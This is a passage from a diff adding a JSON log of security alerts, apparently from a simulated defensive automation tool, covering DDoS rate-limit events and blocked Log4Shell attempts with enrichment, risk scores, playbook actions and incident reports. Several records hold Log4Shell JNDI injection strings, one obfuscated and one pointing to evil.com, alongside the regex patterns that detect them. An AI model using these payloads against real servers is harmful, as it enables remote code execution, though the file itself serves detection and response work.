+      "ip_blocked": "185.220.101.34",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3061,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "ldap://45.142.212.100:1389/exploit",
+    "matched_headers": [
+      {
+        "header": "x-api-version",
+        "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "6d903570-380b-4454-9848-ea72950f4786",
+    "timestamp": "2026-03-08T02:44:08.729Z",
+    "source_ip": "80.82.77.139",
+    "enriched_ip": "80.82.77.139",
+    "alert_type": "ddos",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "80.82.77.139",
+      "alert_type": "ddos",
+      "request_rate": 632,
+      "anomaly_detected": true,
+      "raw_logs": [
+        "[WARN] Rate limit exceeded: 563 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 570 req/min (limit: 100) from 80.82.77.139",
+        "[WARN] Rate limit exceeded: 578 req/min (limit: 100) from 198.235.24.130",
+        "[WARN] Rate limit exceeded: 587 req/min (limit: 100) from 80.82.77.139",
+        "[WARN] Rate limit exceeded: 595 req/min (limit: 100) from 89.248.167.131",
+        "[WARN] Rate limit exceeded: 603 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 612 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 620 req/min (limit: 100) from 89.248.167.131",
+        "[WARN] Rate limit exceeded: 628 req/min (limit: 100) from 198.235.24.130",
+        "[WARN] Rate limit exceeded: 637 req/min (limit: 100) from 198.235.24.130",
+        "[WARN] Rate limit exceeded: 568 req/min (limit: 100) from 80.82.77.139",
+        "[WARN] Rate limit exceeded: 575 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 581 req/min (limit: 100) from 89.248.167.131",
+        "[WARN] Rate limit exceeded: 589 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 596 req/min (limit: 100) from 80.82.77.139",
+        "[WARN] Rate limit exceeded: 603 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 610 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 617 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 625 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 632 req/min (limit: 100) from 198.235.24.130"
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "80.82.77.139",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Censys Scanner",
+        "tags": [
+          "scanner",
+          "shodan"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 7632,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "Netherlands",
+        "city": "Amsterdam",
+        "isp": "IP Volume inc"
+      },
+      "virustotal": {
+        "malicious": 9,
+        "suspicious": 2,
+        "harmless": 61
+      }
+    },
+    "risk_score": 100,
+    "risk_reasoning": "Risk score is 100/100. Request rate of 632 req/min contributed 40.0 points. AbuseIPDB confidence score of 100 added 30.0 points. GreyNoise classified this IP as malicious, adding 20 points. VirusTotal reported 9 malicious votes, contributing 10.0 points.",
+    "selected_playbook": "ddos-mitigation",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "ddos-mitigation",
+      "steps_executed": [
+        "block_ip",
+        "set_rate_limit",
+        "wait_5s",
+        "restore_rate_limit"
+      ],
+      "success": true,
+      "ip_blocked": "80.82.77.139",
+      "rate_limit_tightened_to": 10,
+      "rate_limit_restored_to": 100,
+      "completed_at": "2026-03-08T02:44:13.788Z",
+      "notes": "IP blocked permanently. Rate limit restored to normal."
+    },
+    "analyst_feedback": null
+  },
+  {
+    "id": "771fc3ea-aaeb-49a8-bed0-68f037b61f2b",
+    "timestamp": "2026-03-08T02:44:18.685Z",
+    "source_ip": "45.142.212.100",
+    "enriched_ip": "45.142.212.100",
+    "alert_type": "ddos",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "45.142.212.100",
+      "alert_type": "ddos",
+      "request_rate": 564,
+      "anomaly_detected": true,
+      "raw_logs": [
+        "[WARN] Rate limit exceeded: 546 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 549 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 552 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 556 req/min (limit: 100) from 89.248.167.131",
+        "[WARN] Rate limit exceeded: 559 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 562 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 566 req/min (limit: 100) from 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 569 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 573 req/min (limit: 100) from 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 545 req/min (limit: 100) from 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 548 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 551 req/min (limit: 100) from 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 554 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 558 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 561 req/min (limit: 100) from 45.142.212.100",
+        "[WARN] Rate limit exceeded: 564 req/min (limit: 100) from 89.248.167.131"
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "45.142.212.100",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Mass Scanner",
+        "tags": [
+          "scanner",
+          "bruteforce"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 5213,
+        "countryCode": "RU"
+      },
+      "geoip": {
+        "country": "Moldova",
+        "city": "Ştefan Vodă",
+        "isp": "WorkTitans B.V."
+      },
+      "virustotal": {
+        "malicious": 8,
+        "suspicious": 2,
+        "harmless": 63
+      }
+    },
+    "risk_score": 100,
+    "risk_reasoning": "Risk score is 100/100. Request rate of 564 req/min contributed 40.0 points. AbuseIPDB confidence score of 100 added 30.0 points. GreyNoise classified this IP as malicious, adding 20 points. VirusTotal reported 8 malicious votes, contributing 10.0 points.",
+    "selected_playbook": "ddos-mitigation",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "ddos-mitigation",
+      "steps_executed": [
+        "block_ip",
+        "set_rate_limit",
+        "wait_5s",
+        "restore_rate_limit"
+      ],
+      "success": true,
+      "ip_blocked": "45.142.212.100",
+      "rate_limit_tightened_to": 10,
+      "rate_limit_restored_to": 100,
+      "completed_at": "2026-03-08T02:44:23.761Z",
+      "notes": "IP blocked permanently. Rate limit restored to normal."
+    },
+    "analyst_feedback": null
+  },
+  {
+    "id": "a61b7fda-857e-47ab-bc1d-fe7bfc9cc6d7",
+    "timestamp": "2026-03-08T02:44:28.829Z",
+    "source_ip": "89.248.167.131",
+    "enriched_ip": "89.248.167.131",
+    "alert_type": "ddos",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "89.248.167.131",
+      "alert_type": "ddos",
+      "request_rate": 498,
+      "anomaly_detected": true,
+      "raw_logs": [
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[WARN] Rate limit exceeded: 495 req/min (limit: 100) from 198.235.24.130",
+        "[WARN] Rate limit exceeded: 497 req/min (limit: 100) from 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 499 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 501 req/min (limit: 100) from 198.235.24.130",
+        "[WARN] Rate limit exceeded: 503 req/min (limit: 100) from 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 505 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 507 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 492 req/min (limit: 100) from 198.235.24.130",
+        "[WARN] Rate limit exceeded: 494 req/min (limit: 100) from 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[WARN] Rate limit exceeded: 496 req/min (limit: 100) from 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[WARN] Rate limit exceeded: 498 req/min (limit: 100) from 89.248.167.131"
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "89.248.167.131",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Recyber Scanning",
+        "tags": [
+          "scanner",
+          "web-crawler"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 9841,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "The Netherlands",
+        "city": "Amsterdam",
+        "isp": "IP Volume inc"
+      },
+      "virustotal": {
+        "malicious": 6,
+        "suspicious": 1,
+        "harmless": 66
+      }
+    },
+    "risk_score": 100,
+    "risk_reasoning": "Risk score is 100/100. Request rate of 498 req/min contributed 40.0 points. AbuseIPDB confidence score of 100 added 30.0 points. GreyNoise classified this IP as malicious, adding 20 points. VirusTotal reported 6 malicious votes, contributing 10.0 points.",
+    "selected_playbook": "ip-block",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "ip-block",
+      "steps_executed": [
+        "block_ip"
+      ],
+      "success": true,
+      "restored_at": "2026-03-08T02:44:28.871Z",
+      "notes": "IP blocked successfully."
+    },
+    "analyst_feedback": null
+  },
+  {
+    "id": "0ba35351-f3c1-4fc2-9954-468247071d32",
+    "timestamp": "2026-03-08T02:44:38.713Z",
+    "source_ip": "185.220.101.34",
+    "enriched_ip": "185.220.101.34",
+    "alert_type": "ddos",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "185.220.101.34",
+      "alert_type": "ddos",
+      "request_rate": 432,
+      "anomaly_detected": true,
+      "raw_logs": [
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 434 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 435 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 437 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 438 req/min (limit: 100) from 198.235.24.130",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[WARN] Rate limit exceeded: 429 req/min (limit: 100) from 185.220.101.34",
+        "[WARN] Rate limit exceeded: 430 req/min (limit: 100) from 198.235.24.130",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[WARN] Rate limit exceeded: 432 req/min (limit: 100) from 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139"
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "185.220.101.34",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Tor Exit Node",
+        "tags": [
+          "tor",
+          "vpn"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 2847,
+        "countryCode": "DE"
+      },
+      "geoip": {
+        "country": "Germany",
+        "city": "Brandenburg",
+        "isp": "Stiftung Erneuerbare Freiheit"
+      },
+      "virustotal": {
+        "malicious": 12,
+        "suspicious": 3,
+        "harmless": 58
+      }
+    },
+    "risk_score": 100,
+    "risk_reasoning": "Risk score is 100/100. Request rate of 432 req/min contributed 40.0 points. AbuseIPDB confidence score of 100 added 30.0 points. GreyNoise classified this IP as malicious, adding 20 points. VirusTotal reported 12 malicious votes, contributing 10.0 points.",
+    "selected_playbook": "ip-block",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "ip-block",
+      "steps_executed": [
+        "block_ip"
+      ],
+      "success": true,
+      "restored_at": "2026-03-08T02:44:38.729Z",
+      "notes": "IP blocked successfully."
+    },
+    "analyst_feedback": null
+  },
+  {
+    "id": "bc9201c4-7868-4bd9-9b88-a754ba8d016e",
+    "timestamp": "2026-03-08T02:44:48.655Z",
+    "source_ip": "185.220.101.34",
+    "enriched_ip": "185.220.101.34",
+    "alert_type": "ddos",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "185.220.101.34",
+      "alert_type": "ddos",
+      "request_rate": 373,
+      "anomaly_detected": true,
+      "raw_logs": [
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[WARN] Rate limit exceeded: 407 req/min (limit: 100) from 198.235.24.130",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[WARN] Rate limit exceeded: 409 req/min (limit: 100) from 198.235.24.130",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139"
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "185.220.101.34",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Tor Exit Node",
+        "tags": [
+          "tor",
+          "vpn"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 2847,
+        "countryCode": "DE"
+      },
+      "geoip": {
+        "country": "Germany",
+        "city": "Brandenburg",
+        "isp": "Stiftung Erneuerbare Freiheit"
+      },
+      "virustotal": {
+        "malicious": 12,
+        "suspicious": 3,
+        "harmless": 58
+      }
+    },
+    "risk_score": 97,
+    "risk_reasoning": "Risk score is 97/100. Request rate of 373 req/min contributed 37.3 points. AbuseIPDB confidence score of 100 added 30.0 points. GreyNoise classified this IP as malicious, adding 20 points. VirusTotal reported 12 malicious votes, contributing 10.0 points.",
+    "selected_playbook": "ip-block",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "ip-block",
+      "steps_executed": [
+        "block_ip"
+      ],
+      "success": true,
+      "restored_at": "2026-03-08T02:44:48.670Z",
+      "notes": "IP blocked successfully."
+    },
+    "analyst_feedback": null
+  },
+  {
+    "id": "8a2e32f7-ae27-4415-8794-435210036894",
+    "timestamp": "2026-03-08T02:44:58.793Z",
+    "source_ip": "185.220.101.34",
+    "enriched_ip": "185.220.101.34",
+    "alert_type": "ddos",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "185.220.101.34",
+      "alert_type": "ddos",
+      "request_rate": 305,
+      "anomaly_detected": true,
+      "raw_logs": [
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[WARN] Rate limit exceeded: 407 req/min (limit: 100) from 198.235.24.130",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[WARN] Rate limit exceeded: 409 req/min (limit: 100) from 198.235.24.130",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 45.142.212.100",
+        "[ERROR] Blocked request from banned IP: 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 185.220.101.34",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Blocked request from banned IP: 89.248.167.131",
+        "[ERROR] Blocked request from banned IP: 80.82.77.139",
+        "[ERROR] Anomaly detected — 373 req/min from 185.220.101.34",
+        "[WARN] IP blocked by admin/playbook: 185.220.101.34",
+        "[INFO] Alert sent to DART — source: 185.220.101.34"
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "185.220.101.34",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Tor Exit Node",
+        "tags": [
+          "tor",
+          "vpn"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 2847,
+        "countryCode": "DE"
+      },
+      "geoip": {
+        "country": "Germany",
+        "city": "Brandenburg",
+        "isp": "Stiftung Erneuerbare Freiheit"
+      },
+      "virustotal": {
+        "malicious": 12,
+        "suspicious": 3,
+        "harmless": 58
+      }
+    },
+    "risk_score": 91,
+    "risk_reasoning": "Risk score is 91/100. Request rate of 305 req/min contributed 30.5 points. AbuseIPDB confidence score of 100 added 30.0 points. GreyNoise classified this IP as malicious, adding 20 points. VirusTotal reported 12 malicious votes, contributing 10.0 points.",
+    "selected_playbook": "ip-block",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "ip-block",
+      "steps_executed": [
+        "block_ip"
+      ],
+      "success": true,
+      "restored_at": "2026-03-08T02:44:58.840Z",
+      "notes": "IP blocked successfully."
+    },
+    "analyst_feedback": null
+  },
+  {
+    "id": "f434999b-e09c-40c0-983d-2fce65afb7b4",
+    "timestamp": "2026-03-08T02:45:51.419Z",
+    "source_ip": "80.82.77.139",
+    "enriched_ip": "80.82.77.139",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "80.82.77.139",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 8,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": null,
+      "matched_headers": [
+        {
+          "header": "referer",
+          "value": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+          "pattern": "/\\$\\{(\\$\\{\\::-j\\}|\\$\\{upper:j\\})/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T02:45:39.699Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.703Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.705Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.707Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.675Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.682Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.688Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.694Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.699Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.706Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.707Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.709Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.711Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.699Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.700Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.718Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.724Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "80.82.77.139",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Censys Scanner",
+        "tags": [
+          "scanner",
+          "shodan"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 7632,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "Netherlands",
+        "city": "Amsterdam",
+        "isp": "IP Volume inc"
+      },
+      "virustotal": {
+        "malicious": 9,
+        "suspicious": 2,
+        "harmless": 61
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: referer. JNDI callback URL: unknown. GreyNoise: malicious [scanner, shodan]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "80.82.77.139",
+        "enriched_ip": "80.82.77.139",
+        "attacker_location": "Amsterdam, Netherlands",
+        "attacker_isp": "IP Volume inc",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "shodan"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 7632,
+        "jndi_payload": "unknown",
+        "matched_headers": [
+          {
+            "header": "referer",
+            "value": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+            "pattern": "/\\$\\{(\\$\\{\\::-j\\}|\\$\\{upper:j\\})/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3084,
+        "detected_at": "2026-03-08T02:45:51.419Z",
+        "contained_at": "2026-03-08T02:45:54.504Z"
+      },
+      "ip_blocked": "80.82.77.139",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3084,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": null,
+    "matched_headers": [
+      {
+        "header": "referer",
+        "value": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+        "pattern": "/\\$\\{(\\$\\{\\::-j\\}|\\$\\{upper:j\\})/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "8e47a41e-2cf0-420c-850b-b6f726a3c256",
+    "timestamp": "2026-03-08T02:45:51.429Z",
+    "source_ip": "45.142.212.100",
+    "enriched_ip": "45.142.212.100",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "45.142.212.100",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 8,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "ldap://45.142.212.100:1389/exploit",
+      "matched_headers": [
+        {
+          "header": "user-agent",
+          "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T02:45:39.685Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.689Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.693Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.699Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.703Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.705Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.707Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.675Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.682Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.688Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.694Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.699Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.706Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.707Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.709Z",
+          "level": "ERROR",
